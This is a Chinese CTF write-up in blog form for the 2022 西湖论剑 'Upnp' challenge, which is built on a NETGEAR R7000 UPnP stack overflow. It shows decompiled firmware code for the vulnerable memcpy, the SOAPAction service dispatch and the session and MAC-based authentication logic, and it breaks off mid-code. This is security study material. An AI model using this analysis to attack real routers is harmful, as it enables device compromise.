{"title":"西湖论剑 - Upnp","uid":"cabdfd8510238300fc39d39eb471ed7e","slug":"2022西湖论剑Upnp","date":"2023-04-18T10:38:45.000Z","updated":"2023-04-19T12:02:53.651Z","comments":true,"path":"api/articles/2022西湖论剑Upnp.json","keywords":null,"cover":"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230418/LOGO_large-26.5pizuezdjzk0.jpg","content":"<h1 id=\"西湖论剑WriteUP-Upnp\"><a href=\"#西湖论剑WriteUP-Upnp\" class=\"headerlink\" title=\"西湖论剑WriteUP - Upnp\"></a>西湖论剑WriteUP - Upnp</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>这次应该是以一个NETGEAR R7000路由器的nDay为基础出的题，当时还在想是不是要挖上面的UPnP的0Day，没有意识到需要进行信息收集找相关漏洞分析。后面放出提示才意识到思路错了，在<a href=\"https://blog.grimm-co.com/2022/04/no-hardware-no-problem-emulation-and.html\">No Hardware, No Problem: Emulation and Exploitation (grimm-co.com)</a>中所提到的漏洞就是这次题目的目标</p>\n<p>后面自己又仔细看了看UPnP的协议，再来复现这个题目</p>\n<h2 id=\"漏洞定位\"><a href=\"#漏洞定位\" class=\"headerlink\" title=\"漏洞定位\"></a>漏洞定位</h2><p>通过提示<code>SOAP firmware upgrade checking ... 附近</code>和文章提到的漏洞位置，在upnp服务端的固件更新逻辑部分出现了溢出，后面也是通过字符串索引定位到了溢出位置：</p>\n<p><img src=\"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230418/image-20230307144314888.yy6tq8hq480.webp\"></p>\n<p>在进行memcpy时没有对大小v9进行限制，而v9是通过传入的固件中的数据所计算出来的，即v9可控那么这里就会造成栈溢出；这个漏洞很简单但是问题来了：这个UPnP功能定义在哪？怎么触发？(即逆向回溯)</p>\n<h2 id=\"逆向\"><a href=\"#逆向\" class=\"headerlink\" title=\"逆向\"></a>逆向</h2><p>根据一般的UPnP协议，其提供的服务都会在.XML文件中写明，但是在www文件加下搜索<code>firmware update</code>相关字符串毫无结果。所以这个固件更新功能是内部API，也许其用法写在开发文档中，<strong>那么只能逆出调用该API的UPnP数据包格式</strong>。虽然是个内部API但是估计也是基于UPnP control包的格式开发的：</p>\n<p><img src=\"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230418/image-20230307151910532.21ramsdahm8w.webp\"></p>\n<p>那么对<code>SOAPACTION</code>交叉索引定位到如下函数：</p>\n<p><img src=\"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230418/image-20230307152213758.5ilah3tdi1g0.webp\"></p>\n<p>显然这是用来对http包中的SOAPACTION定位的，那么继续查看调用该函数的地方(<strong>对于不同URL提供不同服务，很有可能存在一个集中处理URL的位置</strong>)：</p>\n<p><img src=\"https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230418/image-20230307152406800.2o3coqhbrpk0.webp\"></p>\n<p>前面几个<code>Public_UPNP_Cx</code>是有对应XML描述文件的，但是<code>soap/server_sa</code>和<code>soap/server_sa/opendns</code>这两个URL是没有任何描述文件的，所以估计在<code>sub_41900</code>中实现了内部API，经过动调分析其函数签名为：<code>sub_41900(int http, int int_fd, in_addr_t in_addr, int pass)</code>，http指向客户发送的http数据，int_fd则是交互socket，in_addr为客户ip，pass暂未分析出来。下面分析该函数中重点部分</p>\n<h3 id=\"服务遍历\"><a href=\"#服务遍历\" class=\"headerlink\" title=\"服务遍历\"></a>服务遍历</h3><p>程序维护了一个<strong>内部服务名列表</strong>，每个最长30字节，一共11个服务；根据<code>SOAPAction</code>字段所指定的服务名获取对应列表下标：</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\">v11 <span class=\"token operator\">=</span> <span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span>http_v4<span class=\"token punctuation\">,</span> <span class=\"token string\">\"SOAPAction:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>v11 <span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\nv12 <span class=\"token operator\">=</span> aDeviceinfo<span class=\"token punctuation\">;</span>                            <span class=\"token comment\">// parentalcontrol: index == 7  DeviceConfig: index == 1</span>\naction_v13 <span class=\"token operator\">=</span> v11 <span class=\"token operator\">+</span> <span class=\"token number\">11</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span>                                   <span class=\"token comment\">// travel 11 internal serverName</span>\n<span class=\"token punctuation\">{</span>\n  ServerNamePTR <span class=\"token operator\">=</span> v12<span class=\"token punctuation\">;</span>\n  v14 <span class=\"token operator\">=</span> <span class=\"token function\">strchr</span><span class=\"token punctuation\">(</span>action_v13<span class=\"token punctuation\">,</span> <span class=\"token char\">'\\r'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  v15 <span class=\"token operator\">=</span> v14 <span class=\"token operator\">-</span> action_v13<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v14 <span class=\"token punctuation\">)</span>                                  <span class=\"token comment\">// action length &lt;= 127</span>\n  <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v15 <span class=\"token operator\">&gt;</span> <span class=\"token number\">126</span> <span class=\"token punctuation\">)</span>\n      v15 <span class=\"token operator\">=</span> <span class=\"token number\">127</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token keyword\">else</span>\n  <span class=\"token punctuation\">{</span>\n    v15 <span class=\"token operator\">=</span> <span class=\"token number\">127</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token function\">strncpy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v93<span class=\"token punctuation\">,</span> action_v13<span class=\"token punctuation\">,</span> v15<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  v101 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n  v16 <span class=\"token operator\">=</span> <span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v93<span class=\"token punctuation\">,</span> v12<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  v12 <span class=\"token operator\">+=</span> <span class=\"token number\">30</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v16 <span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">++</span>v8 <span class=\"token operator\">==</span> <span class=\"token number\">11</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">{</span>\n    serverIdx <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">goto</span> LABEL_14<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\nserverIdx <span class=\"token operator\">=</span> v8<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>内部服务有：<strong>DeviceInfo，DeviceConfig，WANIPConnection，WANEthernetLinkConfig，LANConfigSecurity，WLANConfiguration，Time，ParentalControl，AppSystem，AdvancedQoS，UserOptionsTC</strong></p>\n<p>SOAPAction字段构成为：<code>urn:NETGEAR-ROUTER:service:{ServerName}:1#{ActionName}</code></p>\n<h3 id=\"用户验证\"><a href=\"#用户验证\" class=\"headerlink\" title=\"用户验证\"></a>用户验证</h3><pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\">  cookie <span class=\"token operator\">=</span> <span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span>http_v4<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Cookie:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  v21 <span class=\"token operator\">=</span> <span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span>http_v4<span class=\"token punctuation\">,</span> <span class=\"token string\">\"SOAPAction:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v21 <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>v21 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token char\">'\\r'</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>v21 <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token char\">'\\n'</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span>a1 <span class=\"token operator\">=</span> v21<span class=\"token punctuation\">,</span> v41 <span class=\"token operator\">=</span> <span class=\"token function\">strchr</span><span class=\"token punctuation\">(</span>v21<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>v21 <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>v42 <span class=\"token operator\">=</span> v41<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">{</span>\n    <span class=\"token operator\">*</span>v41 <span class=\"token operator\">=</span> v20<span class=\"token punctuation\">;</span>\n    login <span class=\"token operator\">=</span> <span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">,</span> <span class=\"token string\">\"service:DeviceConfig:1#SOAPLogin\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// service:DeviceConfig:1#SOAPLogin</span>\n    <span class=\"token operator\">*</span>v42 <span class=\"token operator\">=</span> <span class=\"token char\">'\\r'</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token keyword\">else</span>\n  <span class=\"token punctuation\">{</span>\n    login <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> cookie <span class=\"token punctuation\">)</span>\n    login_v23 <span class=\"token operator\">=</span> login<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">else</span>\n    login_v23 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>login_v23 <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span>v91 <span class=\"token operator\">=</span> <span class=\"token function\">strchr</span><span class=\"token punctuation\">(</span>cookie<span class=\"token punctuation\">,</span> <span class=\"token char\">'\\r'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span><span class=\"token comment\">// if logined</span>\n  <span class=\"token punctuation\">{</span>\nLogin_63<span class=\"token operator\">:</span>\n    Addr_EB9C8 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    v43 <span class=\"token operator\">=</span> <span class=\"token function\">inet_ntoa</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">in_addr</span><span class=\"token punctuation\">)</span>int_addr_v6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">strcpy</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>Addr_EB9C8<span class=\"token punctuation\">,</span> v43<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    v44 <span class=\"token operator\">=</span> <span class=\"token function\">inet_ntoa</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">in_addr</span><span class=\"token punctuation\">)</span>int_addr_v6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    v45 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">acosNvramConfig_get</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token string\">\"lan_ipaddr\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">strcmp</span><span class=\"token punctuation\">(</span>v44<span class=\"token punctuation\">,</span> v45<span class=\"token punctuation\">)</span>\n      <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strncmp</span><span class=\"token punctuation\">(</span>action_v13<span class=\"token punctuation\">,</span> <span class=\"token string\">\" urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3Au</span><span class=\"token punctuation\">)</span>\n       <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">strncmp</span><span class=\"token punctuation\">(</span>action_v13<span class=\"token punctuation\">,</span> <span class=\"token string\">\" \\\"urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate\\\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3Cu</span><span class=\"token punctuation\">)</span>\n       <span class=\"token operator\">||</span> serverIdx <span class=\"token operator\">!=</span> <span class=\"token number\">7</span><span class=\"token punctuation\">)</span>\n      <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strncmp</span><span class=\"token punctuation\">(</span>action_v13<span class=\"token punctuation\">,</span> <span class=\"token string\">\" urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x34u</span><span class=\"token punctuation\">)</span>\n       <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">strncmp</span><span class=\"token punctuation\">(</span>action_v13<span class=\"token punctuation\">,</span> <span class=\"token string\">\" \\\"urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin\\\"\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x36u</span><span class=\"token punctuation\">)</span>\n       <span class=\"token operator\">||</span> serverIdx <span class=\"token operator\">!=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n      v94 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n      v95 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n      v96 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n      v97 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n      v98 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n      v99 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n      v100 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n      v93 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n      <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>s<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      v46 <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/tmp/opendns_auth.tbl\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">// login recoder</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v46 <span class=\"token punctuation\">)</span>\n      <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">getMacList</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v93<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>s<span class=\"token punctuation\">,</span> <span class=\"token number\">128</span><span class=\"token punctuation\">,</span> v46<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{</span>\n          <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>s<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v93<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n          <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>v46<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">goto</span> Dofunc_34<span class=\"token punctuation\">;</span>\t\t\t\t\t\t\t<span class=\"token comment\">// if the user`s mac_addr in the recode list then don't need check</span>\n          <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>v46<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        resp_state <span class=\"token operator\">=</span> <span class=\"token number\">401</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">respond</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20000</span><span class=\"token punctuation\">,</span> XMLBODY<span class=\"token punctuation\">,</span> int_fd_v5<span class=\"token punctuation\">,</span> resp_state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">}</span>\n      <span class=\"token keyword\">goto</span> Unauthor_61<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">goto</span> Dofunc_34<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token operator\">*</span>v91 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n  v24 <span class=\"token operator\">=</span> <span class=\"token function\">strstr</span><span class=\"token punctuation\">(</span>cookie<span class=\"token punctuation\">,</span> <span class=\"token string\">\"sess_id=\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>v24 <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">{</span>\n    <span class=\"token operator\">*</span>v91 <span class=\"token operator\">=</span> <span class=\"token number\">13</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">goto</span> Login_63<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  sessPtr <span class=\"token operator\">=</span> v24 <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n  v26 <span class=\"token operator\">=</span> <span class=\"token function\">strchr</span><span class=\"token punctuation\">(</span>v24 <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token char\">';'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v26 <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">{</span>\n    <span class=\"token operator\">*</span>v26 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    v27 <span class=\"token operator\">=</span> v26<span class=\"token punctuation\">;</span>\n    v28 <span class=\"token operator\">=</span> <span class=\"token function\">sessConfirm</span><span class=\"token punctuation\">(</span>sessPtr<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v93<span class=\"token punctuation\">,</span> int_addr_v6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token operator\">*</span>v27 <span class=\"token operator\">=</span> <span class=\"token number\">59</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token keyword\">else</span>\n  <span class=\"token punctuation\">{</span>\n    v28 <span class=\"token operator\">=</span> <span class=\"token function\">sessConfirm</span><span class=\"token punctuation\">(</span>sessPtr<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v93<span class=\"token punctuation\">,</span> int_addr_v6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>v28 <span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">goto</span> Unauthor_61<span class=\"token punctuation\">;</span>\nUnauthor_61<span class=\"token operator\">:</span>\n    resp_state <span class=\"token operator\">=</span> <span class=\"token number\">401</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token function\">respond</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20000</span><span class=\"token punctuation\">,</span> XMLBODY<span class=\"token punctuation\">,</span> int_fd_v5<span class=\"token punctuation\">,</span> resp_state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>验证策略由cookie验证和login验证组成，其中Cookie格式为：<code>sess_id=???????; SameSite=Strict</code>。部分服务提供mac验证，不需要Cookie；在<code>sessConfirm</code>函数中验证session_ID，其内部维护了session列表。</p>\n<h3 id=\"login\"><a href=\"#login\" class=\"headerlink\" title=\"login\"></a>login</h3><p>Cookie中的session ID是通过第一次调用login服务得来的，在<code>sub_41900-&gt;processAction</code>中调用不同服务对应的不同action：</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\">Docontrol_35<span class=\"token operator\">:</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> serverIdx <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span>\n    <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span>v29 <span class=\"token operator\">=</span> ServerNamePTR<span class=\"token punctuation\">,</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s()\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"sa_saveXMLServiceType\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span>soapAction<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">(</span>v30 <span class=\"token operator\">=</span> <span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span>http_v4<span class=\"token punctuation\">,</span> <span class=\"token string\">\"urn:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span>v31 <span class=\"token operator\">=</span> <span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span>v30 <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\":\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span>\n    <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span>v32 <span class=\"token operator\">=</span> <span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span>http_v4<span class=\"token punctuation\">,</span> v29<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">{</span>\nUnauthor_61<span class=\"token operator\">:</span>\n    resp_state <span class=\"token operator\">=</span> <span class=\"token number\">401</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token function\">respond</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20000</span><span class=\"token punctuation\">,</span> XMLBODY<span class=\"token punctuation\">,</span> int_fd_v5<span class=\"token punctuation\">,</span> resp_state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  v33 <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>v29<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">strcat</span><span class=\"token punctuation\">(</span>soapAction<span class=\"token punctuation\">,</span> <span class=\"token string\">\"urn:NETGEAR-ROUTER\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  v34 <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span>soapAction<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>soapAction<span class=\"token punctuation\">[</span>v34<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> v31<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v32<span class=\"token punctuation\">[</span>v33<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> v31<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">strcat</span><span class=\"token punctuation\">(</span>soapAction<span class=\"token punctuation\">,</span> <span class=\"token string\">\":1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sa_service_type_buf=%s\\r\\n\"</span><span class=\"token punctuation\">,</span> soapAction<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  flag_v35 <span class=\"token operator\">=</span> ifSSL<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> ifSSL <span class=\"token punctuation\">)</span>\n    flag_v35 <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n  v36 <span class=\"token operator\">=</span> <span class=\"token function\">processAction</span><span class=\"token punctuation\">(</span>flag_v35<span class=\"token punctuation\">,</span> serverIdx<span class=\"token punctuation\">,</span> http_v4<span class=\"token punctuation\">,</span> int_fd_v5<span class=\"token punctuation\">,</span> pass_v7<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span 